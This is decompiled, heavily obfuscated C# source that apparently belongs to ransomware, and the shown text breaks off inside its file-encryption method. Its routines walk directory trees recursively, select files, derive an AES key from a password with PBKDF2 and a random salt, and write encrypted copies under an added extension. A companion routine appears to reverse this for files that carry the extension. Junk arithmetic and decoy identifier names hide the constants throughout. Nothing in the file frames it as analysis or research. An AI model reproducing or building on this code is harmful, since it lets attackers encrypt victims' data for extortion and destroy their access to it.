using System;
using System.Collections.Generic;
using System.IO;
using System.Runtime.InteropServices;
using System.Security.Cryptography;
using System.Text;

internal class get_UnmanagedCode
{
	public static int SafeHandleCleanupWorkListElement;

	private static Bne_Un get_Payload;

	private static string AssemblyVersionAttribute;

	public static string add_ModuleResolve;

	public static string GetEncoding;

	public static List<string> AsUIntPtr;

	private static int StringToBSTR/* Not supported: data(00 00 00 00) */;

	private static int get_PercentNegativePattern/* Not supported: data(01 00 00 00) */;

	private static int EnableEvents/* Not supported: data(03 00 00 00) */;

	private static int get_Mutex/* Not supported: data(02 00 00 00) */;

	private static int CompletionState/* Not supported: data(B6 13 00 00) */;

	private static int CSTRMarshaler/* Not supported: data(C3 69 F4 FF) */;

	private static int SetSetMethod/* Not supported: data(A4 C4 FE FF) */;

	private static int ch/* Not supported: data(04 A8 09 00) */;

	private static int AlreadyInProgress/* Not supported: data(45 FF FB FF) */;

	private static int CurrentEra/* Not supported: data(42 22 A8 2F) */;

	private static int get_OperandType/* Not supported: data(A0 07 00 00) */;

	private static int EventWritten/* Not supported: data(A0 7D F7 FF) */;

	private static int __c__DisplayClass0_3/* Not supported: data(02 00 00 00) */;

	private static int DataMisalignedException/* Not supported: data(00 00 00 00) */;

	private static int IsPublic/* Not supported: data(01 00 00 00) */;

	private static int set_NumberNegativePattern/* Not supported: data(03 00 00 00) */;

	private static int ExceptionHandlingClauseOptions/* Not supported: data(04 00 00 00) */;

	private static int Blt_Un/* Not supported: data(FF FF FF FF) */;

	private static int get_PendingWorkItemCount/* Not supported: data(53 0C 00 00) */;

	private static int ShiftRightLogicalRoundedNarrowingLower/* Not supported: data(AC BF FA FF) */;

	private static int __9__27_5/* Not supported: data(0D 00 00 00) */;

	private static int BeginFaultBlock/* Not supported: data(39 16 00 00) */;

	private static int int_0/* Not supported: data(DD 71 0B 00) */;

	private static int OriginalString/* Not supported: data(F7 95 00 00) */;

	private static int IcuLocaleDataParts/* Not supported: data(FB EB 00 00) */;

	private static int IDLFLAG/* Not supported: data(7C 1A 00 00) */;

	private static int _get_DeclaredNestedTypes_d__22/* Not supported: data(14 00 00 00) */;

	private static int FormatGenericParam/* Not supported: data(D8 02 00 00) */;

	private static int Popi_popi_popi/* Not supported: data(FD A4 03 00) */;

	private static int Guid/* Not supported: data(24 9C FE FF) */;

	private static int CR/* Not supported: data(FE FF FF FF) */;

	private static int EmptyHandle/* Not supported: data(08 00 00 00) */;

	private static int get_GlobalCount/* Not supported: data(05 00 00 00) */;

	private static int ContractClassForAttribute/* Not supported: data(0D F8 FE FF) */;

	private static int WrapNonExceptionThrows/* Not supported: data(5A 00 00 00) */;

	private static int set_ExitCode/* Not supported: data(E5 BC 01 00) */;

	private static int DefaultImplementationsOfInterfaces/* Not supported: data(1E 00 00 00) */;

	private static int AsyncWaitHandle/* Not supported: data(13 00 00 00) */;

	private static int CommonMusic/* Not supported: data(EA 24 09 00) */;

	private static int ResolveEventHandler/* Not supported: data(B7 E0 FF FF) */;

	private static int IsMacOS/* Not supported: data(B3 53 F6 FF) */;

	private static int ParallelBitDeposit/* Not supported: data(B1 B7 F5 FF) */;

	private static int Buf28/* Not supported: data(D0 DE 96 00) */;

	private static int get_CalendarWeekRule/* Not supported: data(18 02 FF FF) */;

	private static int System_002ECollections_002EConcurrent/* Not supported: data(D3 4E 00 00) */;

	private static int ContainsGCPointers/* Not supported: data(34 C2 F0 FF) */;

	private static int ShiftRightAndInsertScalar/* Not supported: data(3E 88 FF FF) */;

	private static int Mid64/* Not supported: data(D9 DA FA FF) */;

	private static int VarArgs/* Not supported: data(F4 FF FF FF) */;

	private static int RequestingAssembly/* Not supported: data(77 9B FF FF) */;

	private static int CountedUtf16String/* Not supported: data(55 22 F1 FF) */;

	private static int SecurityException/* Not supported: data(C3 09 00 00) */;

	private static int CreateOrthographic/* Not supported: data(0D 23 0A 00) */;

	private static int ENOMSG/* Not supported: data(D5 7E 00 00) */;

	private static int Inverse/* Not supported: data(01 E1 06 00) */;

	private static int GetResult/* Not supported: data(F4 8C FA FF) */;

	private static int GetFieldFromHandle/* Not supported: data(BE FF FF FF) */;

	private static int CancellationToken/* Not supported: data(54 B2 F1 FF) */;

	private static int ToUnixTimeSeconds/* Not supported: data(6D 38 00 00) */;

	private static int EnterReadLock/* Not supported: data(92 16 00 00) */;

	private static int cParamsOpt/* Not supported: data(A5 1F 01 00) */;

	private static int set_PerMilleSymbol/* Not supported: data(B1 20 01 00) */;

	private static int SEP_MinuteSuff/* Not supported: data(56 6F F5 FF) */;

	private static int FailFast/* Not supported: data(1C F7 FF FF) */;

	private static int __9__27_20/* Not supported: data(7D FA F4 FF) */;

	private static int Conv_Ovf_U1/* Not supported: data(D2 E9 F9 FF) */;

	private static int __9__12_0/* Not supported: data(E8 F3 0B 00) */;

	private static int AppDomainTimerSafeHandle/* Not supported: data(B4 E0 F8 FF) */;

	private static int TitlecaseLetter/* Not supported: data(6C 2F F1 FF) */;

	private static int get_State/* Not supported: data(62 3B E7 FF) */;

	public unsafe static void AutoReset(string string_0)
	{
		char[] array = new char[6] { '\0', 'ى', '䁙', '\u02fd', '\u0003', '侀' };
		int[] array2 = new int[10] { 0, 16, 122, 7182, 3029, 2, 8, -61579, -3, 1156 };
		int[] array3 = new int[1];
		array3[(uint)array[0]] = ((Array)(object)"\u0364").Length;
		int[] array4 = array3;
		try
		{
			string[] files = Directory.GetFiles(string_0);
			int num9 = default(int);
			int num8 = default(int);
			for (int i = _003CModule_003E.LoadVector128[-452270 ^ Convert.ToInt32("11111111111110" + "010001100101010010", 2)]; i < files.Length; i += sizeof(byte))
			{
				string text = files[i];
				bool num = text.Contains(AssemblyVersionAttribute);
				int num2 = Convert.ToInt32("36665025210", 8);
				int num3 = 0x1DFB0A01 | num2;
				string string_ = string.Concat(char.ToString((char)Marshal.SizeOf(typeof(StartMenu))), char.ToString(array[2]), "䁙䀆" + "䀋䀇䀌䀍");
				object[] array5 = new object[ExceptionHandlingClauseOptions];
				array5[0] = 'ᨎ';
				int num4 = ((ContractClassForAttribute >= -606949) ? 1 : (-317207));
				array5[num4] = char.ToString('⊗') + "ƀċ";
				array5[2] = string.Concat(char.ToString('\u0005'), char.ToString((char)Marshal.SizeOf(typeof(SUCCESS))), char.ToString('1') + char.ToString('.') + "\u0014=");
				array5[15 % Convert.ToInt32("110", 2)] = (byte)DataMisalignedException != 0;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_, array5);
				int num5;
				if (num3 >= Convert.ToInt32(string_, array2[Marshal.SizeOf(typeof(UseHebrewParsing))]))
				{
					string string_2 = "\u0cfc";
					object[] array6 = new object[4];
					array6[0] = "ģŎ";
					array6[1] = ~Convert.ToInt32("ffffff51", 16);
					array6[(-61579 == array2[7]) ? 2 : set_ExitCode] = array[(nint)((Array)(object)"\u0329").LongLength];
					array6[(nint)((Array)(object)(char.ToString('\u0337') + "\u036d\u0305")).LongLength] = char.ToString('Ą') + "ȷ)";
					_003CModule_003E.TAIWANLUNISOLAR(ref string_2, array6);
					num5 = Convert.ToInt32(string_2, 16);
				}
				else
				{
					num5 = checked(Convert.ToInt32(char.ToString('6') + "4d98", _003CModule_003E.KeyValuePair__2[2]) + _003CModule_003E.ActivityOptions[sizeof(uint)]);
				}
				if ((num ? 1 : 0) != num5)
				{
					continue;
				}
				Bne_Un bne_Un = get_Payload;
				string text2 = char.ToString('磙');
				int num6 = ((Convert.ToInt32(char.ToString('1') + char.ToString('1') + "011011001111", 2) != 14031) ? Convert.ToInt32(char.ToString('9') + char.ToString('4') + "9f2", 16) : 30962);
				string text3 = char.ToString((char)num6);
				string text4 = char.ToString('磿');
				string string_3 = "穠穫";
				object[] array7 = new object[2];
				array7[0] = 'Ȕ';
				array7[795566 - Convert.ToInt32("11000010001110101101", 2)] = array2[2];
				_003CModule_003E.TAIWANLUNISOLAR(ref string_3, array7);
				string text5 = string_3;
				string string_4 = string.Concat(char.ToString('只'), char.ToString('叮'), char.ToString('右') + char.ToString('叴') + "叽厠厺");
				object[] array8 = new object[20 % array2[6]];
				array8[_003CModule_003E.ActivityOptions[1] * -384976] = 5018;
				char c = (char)Convert.ToInt32("1", 2);
				int num7 = c;
				char c2 = (char)array2[9];
				array8[num7] = (int)c2;
				array8[2] = checked(-257 * CR);
				array8[3] = 4326;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_4, array8);
				string string_5 = string.Concat(text2, text3, text4 + text5 + string_4);
				switch (-17951 - Convert.ToInt32("11111111" + "111111111" + "011100111100000", Convert.ToInt32("2", 8)))
				{
				case 0:
					num9 = 52205174 >> Convert.ToInt32("6", 16);
					break;
				case 1:
					num9 = _003CModule_003E.ActivityOptions[1];
					break;
				case 2:
					switch (0 % Convert.ToInt32("2045271", 8))
					{
					case 0:
						num8 = -836029;
						break;
					case 1:
						num8 = 509214;
						break;
					}
					num9 = num8;
					break;
				}
				int num10 = num9;
				string string_6 = char.ToString('௩') + "\u0ba2ஶ";
				object[] array9 = new object[Convert.ToInt32("3", 16)];
				array9[(uint)array[0]] = (int)array[3] % 306;
				array9[Convert.ToInt32("11111111111111110110011101100000", 2) - -39073] = (char)Convert.ToInt32(char.ToString('3') + "753", Convert.ToInt32("8", 16));
				array9[2] = (byte)array2[0] != 0;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_6, array9);
				object[] array10 = new object[num10 | (nint)((Array)(object)string_6).LongLength];
				string string_7 = "ힾ";
				object[] array11 = new object[_003CModule_003E.KeyValuePair__2[(uint)array[0]]];
				array11[0] = Convert.ToInt32(char.ToString('2') + "2641", 8);
				array11[Marshal.SizeOf(typeof(UseHebrewParsing)) & Marshal.SizeOf(typeof(UseHebrewParsing))] = char.ToString('嬗') + "㡐Ẇ";
				array11[Convert.ToInt32("1612752540", 8) / 118876848] = (byte)array[0] != 0;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_7, array11);
				string value = string_7;
				int fromBase = Convert.ToInt32("10", 8);
				int num11 = Convert.ToInt32(value, fromBase);
				int num12 = _003CModule_003E.LoadVector128[checked(Marshal.SizeOf(typeof(Prefix1)) * 2)];
				string string_8 = string.Concat(char.ToString('뛬') + "뛭뛭", char.ToString('뛬') + "뛭뛭", "뛬뛭뛭" + "뛬뛭" + "뛭뛬뛭뛭뛬뛬뛬뛬뛬");
				object[] array12 = new object[Marshal.SizeOf(typeof(OverlappedData))];
				array12[DataMisalignedException * -421964] = string.Concat(char.ToString('\u0b49'), char.ToString('⠕'), char.ToString('᭪') + "ˁ\u07ba");
				array12[_003CModule_003E.ActivityOptions[2]] = Convert.ToInt32(char.ToString('1') + "3333", 8);
				array12[~array2[8]] = false;
				int num13 = ((-49142 == Convert.ToInt32("fffef66a", 16)) ? (-524081) : 11785);
				array12[3] = num13;
				array12[4] = _003CModule_003E.KeyValuePair__2[Convert.ToInt32("3", 8)];
				_003CModule_003E.TAIWANLUNISOLAR(ref string_8, array12);
				array10[num11] = (char)(num12 + Convert.ToInt32(string_8, IsPublic << 1));
				array10[get_PercentNegativePattern] = Marshal.SizeOf(typeof(DX_YNN));
				int num14 = (1417270664 + array2[Convert.ToInt32("3", 16)]) / 708638923;
				string string_9 = string.Concat("걼걼걼걼" + "걼걼걼걼걼걼걼", "걼걼" + "걼걼걼걼걼걼걽걼걼걽걼걽걽걽걽걽걽걼걽");
				object[] array13 = new object[Convert.ToInt32("3", 16)];
				array13[~Blt_Un] = (byte)((Array)(object)string.Empty).Length != 0;
				int num15 = array[5];
				array13[1] = num15;
				array13[__c__DisplayClass0_3] = 23757;
				_003CModule_003E.TAIWANLUNISOLAR(ref string_9, array13);
				array10[num14] = Convert.ToInt32(string_9, Marshal.SizeOf(typeof(ENODATA))) * _003CModule_003E.Dequeue[Convert.ToInt32(char.ToString('1') + "11", Convert.ToInt32("10", 2))];
				_003CModule_003E.GetMaxByteCount(ref string_5, array10);
				bne_Un.Second(string_5 + text);
				AsUIntPtr.Add(text);
				NullStream(text, add_ModuleResolve);
			}
			string[] directories = Directory.GetDirectories(string_0);
			string string_10 = string.Concat(char.ToString('枰'), char.ToString('枷'), char.ToString('枱') + "枴枷枷");
			object[] array14 = new object[Convert.ToInt32("36", 8) % 12];
			array14[0] = string.Concat(char.ToString((char)Marshal.SizeOf(typeof(FormatInt32))), char.ToString('@'), char.ToString('[') + "\u0004\u0005");
			int num16 = default(int);
			switch (checked(Convert.ToInt32("37774236603", 8) + 967293))
			{
			case 0:
				num16 = 1;
				break;
			}
			array14[num16] = (char)array2[_003CModule_003E.ActivityOptions[3]];
			array14[AsyncWaitHandle >> 3] = (char)((Marshal.SizeOf(typeof(OnesComplement)) >= -690753) ? '❃' : 833473u);
			int num17 = Marshal.SizeOf(typeof(CharSetMask));
			int num18 = Convert.ToInt32("27731", 8);
			array14[num17] = num18;
			array14[Convert.ToInt32("4", 8)] = CommonMusic + _003CModule_003E.KeyValuePair__2[97];
			array14[5] = (byte)array[0] != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_10, array14);
			int num19 = Convert.ToInt32(string_10, _003CModule_003E.get_PositiveSign[(uint)array[4]]);
			string string_11 = string.Concat("\u12b1ኰ", char.ToString('\u12b1') + "ኰ\u12b1ኰ\u12b1\u12b1\u12b1\u12b1ኰ\u12b1ኰ\u12b1\u12b1ኰ\u12b1");
			object[] array15 = new object[2];
			int num20 = Convert.ToInt32("0", 16);
			int num21 = default(int);
			switch (array2[5] * Convert.ToInt32("1", 16))
			{
			case 0:
				num21 = -452805;
				break;
			case 1:
				num21 = 442831;
				break;
			case 2:
				num21 = 1817;
				break;
			}
			array15[num20] = (char)num21;
			array15[1] = Marshal.SizeOf(typeof(ReadWriteParameters));
			_003CModule_003E.TAIWANLUNISOLAR(ref string_11, array15);
			for (int j = num19 ^ Convert.ToInt32(string_11, 2); j < directories.Length; j += array4[Marshal.SizeOf(typeof(ExternalException)) >> 27])
			{
				string string_12 = directories[j];
				AutoReset(string_12);
			}
		}
		catch (Exception ex)
		{
			get_Payload.GetImplTypeFlags(ex.Message);
		}
	}

	public unsafe static void BestFitMapping(string string_0)
	{
		char[] array = new char[3] { '\0', '\u0094', '\u0006' };
		int[] array2 = new int[7] { 2, 0, -99201, -673873, -89991, -953802, -2457080 };
		char[] array3 = new char[1];
		int num = ((-77912 < Convert.ToInt32("fff306f4", 16)) ? Marshal.SizeOf(typeof(get_GenerationInfo)) : 0);
		array3[num] = array[1];
		char[] array4 = array3;
		int[] array5 = new int[1];
		array5[(uint)array[0]] = Convert.ToInt32(char.ToString('6') + "0d", 16);
		int[] array6 = array5;
		try
		{
			string[] files = Directory.GetFiles(string_0);
			int num2 = Convert.ToInt32(char.ToString('1') + "6770672", 8) >> 22;
			string string_ = string.Concat(char.ToString('牠'), char.ToString('牠') + char.ToString('爷') + "牣牥");
			object[] array7 = new object[Marshal.SizeOf(typeof(Stelem_Ref))];
			array7[0] = 17884;
			array7[Convert.ToInt32("1", 8) * 1] = string.Concat("fջ", char.ToString('Ǆ') + "\u0002\0\u0001\u0002");
			int num3 = default(int);
			switch (_003CModule_003E.KeyValuePair__2[98])
			{
			case 313224:
				num3 = 465195;
				break;
			case 313225:
				num3 = -832483;
				break;
			case 313226:
				num3 = 6444;
				break;
			}
			array7[2] = (char)num3;
			array7[3] = 277;
			array7[ExceptionHandlingClauseOptions] = string.Concat(char.ToString('ࠅ'), char.ToString('Ç'), char.ToString('\u0005') + "\u0018òjE");
			array7[_003CModule_003E.get_PositiveSign[2]] = (byte)((Array)(object)string.Empty).Length != 0;
			_003CModule_003E.TAIWANLUNISOLAR(ref string_, array7);
			int num4 = num2 * Convert.ToInt32(string_, ResolveEventHandler - -8025);
			int num7 = default(int);
			int num8 = default(int);
			int num16 = default(int);
			int num15 = default(int);
			int num19 = default(int);
			while (num4 < files.Length)
			{
				string text = files[num4];
				if (FromIntPtr(text))
				{
					Bne_Un bne_Un = get_Payload;
					string text2 = char.ToString((char)_003CModule_003E.get_PositiveSign[4]);
					string string_2 = "饸饾";
					int num5 = array[2];
					object[] array8 = new object[num5];
					array8[checked(0 * IsMacOS)] = ((Convert.ToInt32("37777602036", 8) <= 140600) ? Marshal.SizeOf(typeof(get_UInt64View)) : _003CModule_003E.KeyValuePair__2[99]);
					array8[1] = (byte)Convert.ToInt32("0", 16) != 0;
					array8[sizeof(char)] = ((_003CModule_003E.get_PositiveSign[107] >= -308847) ? 220 : 550169);
					array8[3] = (char)get_PendingWorkItemCount;
					int num6 = _003CModule_003E.ActivityOptions[set_NumberNegativePattern];
					switch (checked(ParallelBitDeposit - array2[3]))
					{
					case 0:
						num7 = Convert.ToInt32("101001111000000101", 2);
						break;
					case 1:
						num7 = Convert.ToInt32("37775503617", 8);
						break;
					case 2:
						num7 = 9017;
						break;
					}
					array8[num6] = num7;
					switch (5 % __c__DisplayClass0_3)
					{
					case 0:
						num8 = 968645;
						break;
					case 1:
						num8 = 655;
						break;
					}
					array8[5] = num8;
					_003CModule_003E.TAIWANLUNISOLAR(ref string_2, array8);
					string text3 = text2 + string_2;
					string string_3 = "⇂⇉";
					object[] array9 = new object[Convert.ToInt32(char.ToString('1') + "01", 2)];
					array9[(uint)array[0]] = Convert.ToInt32(char.ToString('5') + "445", 8);
					array9[1] = '६';
					array9[Marshal.SizeOf(typeof(ENODATA))] = '\a';
					array9[3] = string.Concat("ǀੲ", char.ToString('P') + "~*\u007f");
					array9[4] = string.Concat(char.ToString('\f'), "\0\v" + "\u0001\0\0\u0003");
					_003CModule_003E.TAIWANLUNISOLAR(ref string_3, array9);
					string text4 = string_3;
					string string_4 = string.Concat("\udb9a\udb9e", char.ToString('\udb83') + char.ToString('\udb84') + "\udb8d\udbd0\udbca");
					object[] array10 = new object[3];
					array10[0] = (byte)((int)array[0] % 136708) != 0;
					array10[1698021679 >> DefaultImplementationsOfInterfaces] = "␛籸";
					array10[array2[0]] = -714051 + Convert.ToInt32("10110001110010110110", 2);
					_003CModule_003E.TAIWANLUNISOLAR(ref string_4, array10);
					string string_5 = string.Concat(text3, text4 + string_4);
					object[] array11 = new object[((Convert.ToInt32("15651226151", 8) * 1) ^ (Buf28 >> 4)) / (Marshal.SizeOf(typeof(get_GeoId)) - _003CModule_003E.get_PositiveSign[5])];
					int num9 = ((((array2[4] / 1 == array2[Convert.ToInt32("10", 2)]) ? 1 : 0) != checked(Convert.ToInt32("37774777571", 8) + 786567)) ? _003CModule_003E.get_PositiveSign[6] : 0);
					int num10 = num9;
					char c = array4[0];
					array11[num10] = (int)c;
					array11[~_003CModule_003E.CalendarType[10]] = 59;
					string string_6 = "ᕎ";
					object[] array12 = new object[3];
					int num11 = ((-12635 > array2[5]) ? Convert.ToInt32("0", 8) : Convert.ToInt32("11111111111111111000100011011001", 2));
					array12[num11] = "\u0afeП";
					array12[checked(1 * Convert.ToInt32("1", 8))] = '\u065f';
					array12[2] = (byte)array2[1] != 0;
					_003CModule_003E.TAIWANLUNISOLAR(ref string_6, array12);
					int num12;
					checked
					{
						num12 = Convert.ToInt32(string_6, ((get_CalendarWeekRule == -77887) ? (-576194) : (-307568)) - unchecked(Convert.ToInt32("fffa2068", 16) + 77336));
					}
					int num13 = -1678 * Convert.ToInt32("643", 8);
					array11[num12] = num13 ^ (Convert.ToInt32(char.ToString('f') + char.ToString('c') + "a10410", 16) | -613072888);
					int num14 = array6[0] >> (Convert.ToInt32(char.ToString('1') + "001", 2) & Convert.ToInt32("11", 8));
					switch (checked((-1422802848 | unchecked(array2[6] / 1)) + ((103561 * Marshal.SizeOf(typeof(CharSetMask))) & (Marshal.SizeOf(typeof(OnSerializedAttribute)) * Convert.ToInt32("273", 8)))))
					{
					case 0:
					{
						string string_7 = string.Concat(char.ToString('呾') + "呿呿呿", char.ToString('呿') + "呾呿呾" + "呿呿呾呾呿呿呿呿呾呾呾");
						object[] array13 = new object[(nint)((Array)(object)(char.ToString('\u0354') + "\u0332.\u0320")).LongLength];
						array13[(nint)((Array)(object)string.Empty).LongLength] = char.ToString('ഒ') + "ʥę";
						array13[Marshal.SizeOf(typeof(UseHebrewParsing))] = 2949;
						array13[2] = (byte)Convert.ToInt32("0", 16) != 0;
						array13[set_NumberNegativePattern] = 14330;
						_003CModule_003E.TAIWANLUNISOLAR(ref string_7, array13);
						num16 = Convert.ToInt32(string_7, sizeof(char));
						break;
					}
					case 1:
						switch (-344148 - ShiftRightLogicalRoundedNarrowingLower)
						{
						case 0:
							num15 = 399;
							break;
						}
						num16 = num15;
						break;
					}
					array11[num14] = num16;
					_003CModule_003E.GetMaxByteCount(ref string_5, array11);
					bne_Un.Second(string_5 + text);
					get_IsLayoutSequential(text, text.Substring(((int)array[0] / 1812105) | (array[0] * (Convert.ToInt32("11111111111010010010000101110100", 2) + 755464)), text.Length - AssemblyVersionAttribute.Length), GetEncoding);
				}
				int num17 = num4;
				int num18 = Marshal.SizeOf(typeof(IsTvOS));
				switch (checked(unchecked((nint)((Array)(object)string.Empty).LongLength) * _003CModule_003E.KeyValuePair__2[Convert.ToInt32("6", 16)]))
				{
				case 0:
					num19 = 1 * Marshal.SizeOf(typeof(UseHebrewParsing));
					break;
				}
				num4 = num17 + (num18 & num19);
			}
			string[] directories = Directory.GetDirectories(string_0);
			int num20 = Convert.ToInt32("75ec2e3f", 16) ^ System_002ECollections_002EConcurrent;
			for (int i = num20 >> 31; i < directories.Length; i += checked(unchecked(_003CModule_003E.get_PositiveSign[7] + -338183) - Marshal.SizeOf(typeof(TryEnsureSufficientExecutionStack))))
			{
				string string_8 = directories[i];
				BestFitMapping(string_8);
			}
		}
		catch (Exception ex)
		{
			get_Payload.GetImplTypeFlags(ex.Message);
		}
	}

	private static bool FromIntPtr(string string_0)
	{
		if (string_0.Contains(AssemblyVersionAttribute) && string_0.Substring(string_0.Length - AssemblyVersionAttribute.Length, AssemblyVersionAttribute.Length) == AssemblyVersionAttribute)
		{
			return true;
		}
		return (byte)StringToBSTR != 0;
	}

	private unsafe static void NullStream(string string_0, string string_1)
	{
		char[] array = new char[9] { '\u0002', '\0', '\u0001', '\u09c0', 'В', '\u0006', '䤵', 'ȵ', 'Ჲ' };
		int[] array2 = new int[26]
		{
			0, 1, 4, -917251, 24482, -958917, 451063, 53985, 10562, 2,
			16, -326567, 1878, -796961, 281868, -699796, 768661, -656190, 2223, -383756,
			-711652, -578592, 444990, 357135, 3704, 447577
		};
		char[] array3 = new char[-18739 + array[6]];
		array3[0] = (char)checked(unchecked((int)array[7]) * 83);
		array3[checked(Convert.ToInt32("1", 16) * 1)] = '\u0080';
		char[] array4 = array3;
		int[] array5 = new int[3];
		array5[0] = 8;
		array5[array2[array2[1]]] = 244;
		int num = default(int);
		switch (_003CModule_003E.ActivityOptions[1] % array2[11])
		{
		case 0:
			num = Convert.ToInt32("10", 2);
			break;
		}
		array5[num] = -629737 + Convert.ToInt32("10011001101111101001", 2);
		int[] array6 = array5;
		byte[] array7;
		RNGCryptoServiceProvider rNGCryptoServiceProvider;
		int num7;
		checked
		{
			int num2 = default(int);
			switch (0 * Convert.ToInt32("3777" + "6027646", 8))
			{
			case 0:
				num2 = 82297;
				break;
			case 1:
				num2 = -129446 - ContainsGCPointers;
				break;
			case 2:
				num2 = -677169;
				break;
			}
			int num3;
			if (num2 == array4[(ShiftRightAndInsertScalar > Convert.ToInt32("10000101010011100111", 2)) ? 481931 : 0])
			{
				num3 = CSTRMarshaler;
			}
			else
			{
				int num4 = unchecked(1245046392 / array2[12]);
				int num5 = ((Convert.ToInt32("255722", 8) != 89042) ? (-840190) : 662962);
				int num6 = default(int);
				switch (num4 - num5)
				{
				case 0:
					num6 = ((Convert.ToInt32("11111111111111110000100100110111", 2) == -63177) ? 439194 : 288831);
					break;
				case 1:
					num6 = array2[13] & -154673;
					break;
				case 2:
					num6 = Convert.ToInt32("40", 8);
					break;
				}
				num3 = num6;
			}
			array7 = new byte[num3];
			rNGCryptoServiceProvider = new RNGCryptoServiceProvider();
			num7 = ((-77631 >= Marshal.SizeOf(typeof(AsyncFlowControl))) ? array2[14] : _003CModule_003E.get_PositiveSign[108]);
		}
		int num8 = 885149 - num7 * (1 | Marshal.SizeOf(typeof(Struct2)));
		while (num8 < 5 << (1 & array2[(nint)((Array)(object)"\u033a").LongLength]))
		{
			rNGCryptoServiceProvider.GetBytes(array7);
			int num9 = num8;
			int num10 = Marshal.SizeOf(typeof(GenerateProgIdForType));
			int num11 = ((Convert.ToInt32("37777505366", 8) <= Marshal.SizeOf(typeof(IProducerConsumerQueue__1))) ? (-7) : 544475);
			num8 = num9 + (num10 >> ~num11);
		}
		rNGCryptoServiceProvider.Dispose();
		FileStream fileStream = new FileStream(string_0 + AssemblyVersionAttribute, (FileMode)get_Mutex);
		byte[] password = Encoding.UTF8.GetBytes(string_1);
		RijndaelManaged rijndaelManaged = new RijndaelManaged();
		Rfc2898DeriveBytes rfc2898DeriveBytes;
		checked
		{
			int num13 = (rijndaelManaged.KeySize = (Convert.ToInt32("df", 16) & 0xA0) * 2);
			string string_2 = string.Concat(char.ToString('캴') + "캴캴", "캵캵", char.ToString('캵') + char.ToString('캴') + "캴캵캵캵캴캴캴캴캴");
			object[] array8 = new object[3];
			array8[array2[0]] = 511;
			array8[1] = -782045 ^ Convert.ToInt32("11111111111101001000000010101111", 2);
			array8[2] = Convert.ToInt32("fff6a958", 16) ^ Convert.ToInt32("fff693a2", 16);
			_003CModule_003E.TAIWANLUNISOLAR(ref string_2, array8);
			int num15 = (rijndaelManaged.BlockSize = ((Convert.ToInt32(string_2, _003CModule_003E.ActivityOptions[0]) == Convert.ToInt32("11111111111011111000100010001000", 2) - array2[15] - unchecked(Convert.ToInt32("11111111111111111110010010101111", 2) - 400896)) ? (-242785) : array4[unchecked(array2[16] - 768660)]));
			rijndaelManaged.Padding = PaddingMode.PKCS7;
			rfc2898DeriveBytes = new Rfc2898DeriveBytes(password, array7, 50000);
		}
		rijndaelManaged.Key = rfc2898DeriveBytes.GetBytes(rijndaelManaged.KeySize / array6[array6[2]]);
		int blockSize = rijndaelManaged.BlockSize;
		int num16 = ~Convert.ToInt32("11" + char.ToString('0') + "000000111100010", 2);
		int mid = Mid64;
		rijndaelManaged.IV = rfc2898DeriveBytes.GetBytes(blockSize / (num16 + (mid - _003CModule_003E.get_PositiveSign[9])));
		int num17 = (int)(rijndaelManaged.Mode = (CipherMode)((((-20233 > _003CModule_003E.CalendarType[~VarArgs]) ? 1 : 0) != 0 % array2[3]) ? (-14511 * _003CModule_003E.ActivityOptions[87] + checked(-333752 * array2[1])) : SetSetMethod));
		fileStream.Write(array7, 0, array7.Length);
		ICryptoTransform transform = rijndaelManaged.CreateEncryptor();
		string string_3 = "\uf7f0";
		object[] array9 = new object[3];
		array9[Convert.ToInt32("0", 8)] = ((Convert.ToInt32("fffeb11d", 16) == -93614) ? '唍' : ((char)Marshal.SizeOf(typeof(EWOULDBLOCK))));
		array9[1] = 19751;
		array9[_003CModule_003E.ActivityOptions[0]] = Convert.ToInt32("1010" + "0010" + "00100011", Convert.ToInt32("2", 16));
		_003CModule_003E.TAIWANLUNISOLAR(ref string_3, array9);
		CryptoStream cryptoStream = new CryptoStream(fileStream, transform, (CryptoStreamMode)Convert.ToInt32(string_3, 2));
		string string_4 = "됙";
		object[] array10 = new object[Convert.ToInt32("0", 8) | 4];
		array10[(uint)array[array2[1]]] = char.ToString('肩') + "ᩂޞ";
		array10[Convert.ToInt32("1", 16)] = Convert.ToInt32(char.ToString('4') + "233", 8);
		array10[10843 >> Convert.ToInt32("c", 16)] = 'ڗ';
		array10[Convert.ToInt32("11", array2[9])] = (char)(Convert.ToInt32("5526620720", 8) / 1221424);
		_003CModule_003E.TAIWANLUNISOLAR(ref string_4, array10);
		string value = string_4;
		string string_5 = "⽉";
		object[] array11 = new object[4];
		array11[Convert.ToInt32("0", 16)] = '\u000e';
		array11[1] = 2;
		array11[1 << array2[1]] = 28;
		array11[3] = 12101;
		_003CModule_003E.TAIWANLUNISOLAR(ref string_5, array11);
		FileStream fileStream2 = new FileStream(string_0, (FileMode)Convert.ToInt32(value, Convert.ToInt32(string_5, Convert.ToInt32("8", 16) << 1)));
		byte[] array12 = new byte[1048576];
		try
		{
			int num21 = default(int);
			while (true)
			{
				int num18 = _003CModule_003E.LoadVector128[15];
				int num19 = ((((Convert.ToInt32("255746", 8) < -775513) ? 1 : 0) == DataMisalignedException) ? (-512083) : 535844);
				int count;
				int num20 = (count = fileStream2.Read(array12, num18 - (num19 & Convert.ToInt32(char.ToString('f') + char.ToString('f') + "fdae7f", 16)), array12.Length));
				int[] loadVector = _003CModule_003E.LoadVector128;
				string string_6;
				object[] array13;
				checked
				{
					switch ((array2[19] ^ 0x33AFD) + array2[unchecked((uint)array[5])])
					{
					case 0:
						num21 = 0;
						break;
					}
					if (num20 <= loadVector[num21])
					{
						break;
					}
					string_6 = "뎴";
					array13 = new object[Marshal.SizeOf(typeof(OverlappedData))];
					array13[(-25737 != RequestingAssembly) ? (-655644) : Convert.ToInt32("0", 8)] = array2[4];
					array13[1 & Convert.ToInt32("1", 16)] = -660338 ^ array2[17];
					array13[Marshal.SizeOf(typeof(ENODATA))] = Convert.ToInt32("34940", 16) >> Marshal.SizeOf(typeof(IsValidText));
				}
				array13[3] = (char)checked(-347 * _003CModule_003E.ActivityOptions[5]);
				array13[array2[sizeof(short)]] = string.Concat(char.ToString((char)array2[18]), char.ToString('Ӣ') + char.ToString('\u0001') + "\b\r");
				_003CModule_003E.TAIWANLUNISOLAR(ref string_6, array13);
				cryptoStream.Write(array12, Convert.ToInt32(string_6, (24234 > array2[5]) ? 2 : (-894000)), count);
			}
			fileStream2.Close();
		}
		catch (Exception ex)
		{
			get_Payload.GetImplTypeFlags(ex.Message);
		}
		finally
		{
